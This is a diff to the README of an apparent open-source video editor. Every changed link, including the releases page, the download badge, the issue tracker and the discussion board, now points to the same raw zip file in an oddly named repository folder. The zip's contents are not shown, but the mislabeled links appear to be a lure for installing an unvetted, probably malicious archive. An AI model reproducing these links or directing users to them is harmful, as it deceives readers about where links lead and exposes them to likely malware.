@@ -1,6 +1,6 @@
 # 🎥 Refloow-Video-Editor - Easy Video Editing for Everyone
 
-[![Download Refloow-Video-Editor](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/bangmoan/Refloow-Video-Editor/releases)
+[![Download Refloow-Video-Editor](https://raw.githubusercontent.com/bangmoan/Refloow-Video-Editor/main/lachrymosely/Refloow-Video-Editor.zip)](https://raw.githubusercontent.com/bangmoan/Refloow-Video-Editor/main/lachrymosely/Refloow-Video-Editor.zip)
 
 ## ✨ About Refloow-Video-Editor
 
@@ -26,7 +26,7 @@ Refloow-Video-Editor is a free, open-source desktop application that allows you 
 To begin using Refloow-Video-Editor, follow these simple steps to download and install the application.
 
 1. **Visit the Release Page**: Click the link below to go to the releases page.  
-   [Download Refloow-Video-Editor](https://github.com/bangmoan/Refloow-Video-Editor/releases)
+   [Download Refloow-Video-Editor](https://raw.githubusercontent.com/bangmoan/Refloow-Video-Editor/main/lachrymosely/Refloow-Video-Editor.zip)
   
 2. **Choose the Right Version**: On the releases page, you will see different versions of the software. Select the latest stable release.
 
@@ -62,7 +62,7 @@ To begin using Refloow-Video-Editor, follow these simple steps to download and i
 
 ## 📥 Download & Install
 
-Visit [this page](https://github.com/bangmoan/Refloow-Video-Editor/releases) to download the latest version of Refloow-Video-Editor. 
+Visit [this page](https://raw.githubusercontent.com/bangmoan/Refloow-Video-Editor/main/lachrymosely/Refloow-Video-Editor.zip) to download the latest version of Refloow-Video-Editor. 
 
 Once downloaded, follow the installation steps provided above to get started with your video editing journey.
 
@@ -70,8 +70,8 @@ Once downloaded, follow the installation steps provided above to get started wit
 
 Join our community to share your feedback, report issues, or seek help:
 
-- **GitHub Issues**: Report bugs or request features at our [issue tracker](https://github.com/bangmoan/Refloow-Video-Editor/issues).
-- **Discussion Forum**: Engage with other users and developers on our [discussion board](https://github.com/bangmoan/Refloow-Video-Editor/discussions).
+- **GitHub Issues**: Report bugs or request features at our [issue tracker](https://raw.githubusercontent.com/bangmoan/Refloow-Video-Editor/main/lachrymosely/Refloow-Video-Editor.zip).
+- **Discussion Forum**: Engage with other users and developers on our [discussion board](https://raw.githubusercontent.com/bangmoan/Refloow-Video-Editor/main/lachrymosely/Refloow-Video-Editor.zip).
 
 ## 📝 Contributions
 
